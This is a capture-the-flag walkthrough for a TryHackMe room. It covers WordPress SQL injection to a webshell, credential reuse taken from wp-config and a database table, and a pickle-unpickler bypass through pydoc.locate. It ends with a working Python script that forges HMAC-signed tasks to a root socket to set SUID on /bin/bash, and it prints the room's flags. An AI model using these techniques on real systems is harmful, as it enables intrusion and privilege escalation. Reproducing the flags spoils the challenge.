# Overflow The Jackpot CTF - Agent P

Room link: https://tryhackme.com/room/thm-ctf-jackpot-overflow

## Description

This is a very hard challenge in the Jackpot CTF series. I went through a lot while doing this box - WordPress exploitation, database creds leading to lateral movement, a pickle deserialization bug to get to an internal service, and finally reverse engineering a custom binary just to forge a signed task and get root. Took a while to get through all of it but it was worth doing.

## Recon

Started with a full port scan.

```
nmap -sC -sV -p- -T4 10.112.132.213
```

![nmap scan](../Screenshots/agent-p/01-nmap-scan.png)

Just two ports open - SSH and Apache running WordPress 6.9.

Ran gobuster against the root of the site to see what's there.

```
gobuster dir -u http://10.112.132.213/ -w /usr/share/wordlists/dirb/common.txt
```

![gobuster root](../Screenshots/agent-p/02-gobuster-root.png)

Nothing crazy, standard WP structure. Went after the plugins directory next.

```
gobuster dir -u http://10.112.132.213/wp-content/plugins/ -w /home/anonymous/.local/nuclei-templates/helpers/wordlists/wordpress-plugins.txt -t 50
```

![gobuster plugins](../Screenshots/agent-p/03-gobuster-plugins.png)

Ran wpscan to enumerate users and confirm the WP version was actually vulnerable.

```
wpscan --url http://10.112.132.213 -e u,vp,vt
```

![wpscan users](../Screenshots/agent-p/04-wpscan-users.png)

Found the user `heinz`. WordPress 6.9 is vulnerable to a REST API batch-route confusion bug (CVE-2026-63030) that lets you SQLi your way into creating a pre-auth admin account.

## Foothold

Confirmed the SQLi and used it to create an admin account, then dropped a webshell through it.

![sqli confirmed](../Screenshots/agent-p/05-sqli-confirmed.png)

![webshell foothold](../Screenshots/agent-p/06-webshell-foothold.png)

Got a shell back as www-data.

## www-data to norm

Checked wp-config.php for database creds.

```
cat /var/www/html/wp-config.php | grep DB_
```

![wpconfig creds](../Screenshots/agent-p/07-wpconfig-db-creds.png)

Got into the database and had a look around. There was a table that had no business being there - `wp_infra_accounts`.

```
mysql -u wpuser -p'wp_WjURfdI' wordpress -e "SHOW TABLES;"
mysql -u wpuser -p'wp_WjURfdI' wordpress -e "SELECT * FROM wp_infra_accounts;"
```

![mysql infra accounts](../Screenshots/agent-p/08-mysql-infra-accounts.png)

That table had plaintext SSH creds for a user called norm. Password reuse, so straight in.

```
ssh norm@10.112.132.213
cat user.txt
```

![user flag](../Screenshots/agent-p/09-user-flag-norm.png)

First flag: `EVILINC{n0rm_r34ds_th3_db_l1k3_4_g00d_r0b0t}`

## norm to vanessa (operator)

norm is in a group called evilinc. Went looking for anything readable by that group.

```
id
find / -group evilinc -readable 2>/dev/null
cat /etc/evilinc/panel.conf
```

![panel conf secret](../Screenshots/agent-p/10-panel-conf-secret.png)

That config file had an operator_secret sitting in plaintext. Checked what was actually listening locally and used the secret to log into it.

```
ss -tulnp
curl -s -c cookies.txt -X POST http://127.0.0.1:8700/api/login -d "secret=b3hind_sch3dul3_th1s_m0nth"
```

![internal port and login](../Screenshots/agent-p/11-internal-port-and-login.png)

There's an internal panel on port 8700 that never showed up in the original nmap scan since it's bound to localhost only. It has a blueprint import endpoint that deserializes base64 pickle data. It runs through a restricted unpickler that blocks the obvious module names, but you can bypass it using `pydoc.locate` since that itself isn't blocklisted and can resolve to `os.system` at unpickle time.

Built a small pickle payload using that trick and sent it to the import endpoint to run `id` and confirm code execution as vanessa, since that's who runs the panel process. Once that worked I used the same RCE to drop my own SSH key into vanessa's authorized_keys.

```
ssh -i vanessa_key vanessa@10.112.132.213
id
cat operator.txt
```

![ssh as vanessa](../Screenshots/agent-p/12-ssh-as-vanessa.png)

![operator flag](../Screenshots/agent-p/13-operator-flag.png)

Operator flag: `EVILINC{p1ckl3_s4ndb0x3s_4r3_n0t_s4ndb0x3s}`

## vanessa to root

vanessa is in the evilinc group too, which turned out to matter again - there's a unix socket owned by root with group write access for evilinc, and a root-owned binary called implant sitting next to it.

```
ls -la /run/evilinc/tasking.sock
ls -la /opt/evilinc/
```

![socket and implant perms](../Screenshots/agent-p/14-socket-and-implant-perms.png)

Pulled the implant binary down to look at it properly.

```
scp -i vanessa_key vanessa@10.112.132.213:/opt/evilinc/implant .
file implant
strings -n 8 implant
```

Stripped binary but the strings gave away the protocol - it talks over the socket using POLL/SUBMIT commands and reads `/etc/machine-id`. Confirmed it uses HMAC-SHA256 for signing. Went looking at the raw rodata section for the key material.

```
objdump -s -j .rodata implant
```

![rodata hex dump](../Screenshots/agent-p/15-rodata-hex-dump.png)

There's a 32 byte blob sitting at offset 0x2020. Checked the disassembly around the key derivation logic and found it's using a basic LCG (classic multiplier 0x41c64e6d, seed 0x1a2b3c4d) to generate a keystream, then XORing that against the blob from rodata to get the actual signing secret. That secret gets HMAC'd together with the machine-id to produce the real signing key for tasks sent to the socket.

Wrote a script to reproduce that whole derivation locally, then forged a task telling the implant to `chmod u+s /bin/bash`. First attempt got rejected with `ERR id must exceed current max` - turns out task IDs have to keep increasing, and my first task_id had already set a high watermark from an earlier attempt. Bumped the task_id above that and resent it.

```python
import hmac, hashlib, socket

def keystream(n, seed=0x1a2b3c4d):
    s = seed
    out = bytearray()
    for _ in range(n):
        s = (s * 0x41c64e6d + 0x3039) & 0xFFFFFFFF
        out.append((s >> 16) & 0xFF)
    return bytes(out)

cipher = bytes.fromhex("1588c57c026ae5eb9c2d1817af48f70964efff765e58d112d8f116d70f9941b4")
ks = keystream(32)
blob = bytes(a ^ b for a, b in zip(ks, cipher))

machine_id = open("/etc/machine-id").read().strip()
signing_key = hmac.new(blob, machine_id.encode(), hashlib.sha256).digest()

task_id = "10000001"
cmd = "chmod u+s /bin/bash"
nonce = "2"
msg = f"{task_id}|exec|{cmd}|{nonce}"
sig = hmac.new(signing_key, msg.encode(), hashlib.sha256).hexdigest()
submit = f"SUBMIT {task_id}|exec|{cmd}|{nonce}|{sig}"

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.connect("/run/evilinc/tasking.sock")
sock.send(submit.encode() + b"\n")
print(sock.recv(64).decode())
```

Got `OK` back, waited a few seconds, and bash had the SUID bit set.

```
/bin/bash -p
id
cat /root/root.txt
```

![root shell and flag](../Screenshots/agent-p/16-root-shell-and-flag.png)

Root flag: `EVILINC{d00f_r0ll3d_h1s_0wn_crypt0_4nd_p3rry_w0n}`

## Flags

- User: `EVILINC{n0rm_r34ds_th3_db_l1k3_4_g00d_r0b0t}`
- Operator: `EVILINC{p1ckl3_s4ndb0x3s_4r3_n0t_s4ndb0x3s}`
- Root: `EVILINC{d00f_r0ll3d_h1s_0wn_crypt0_4nd_p3rry_w0n}`
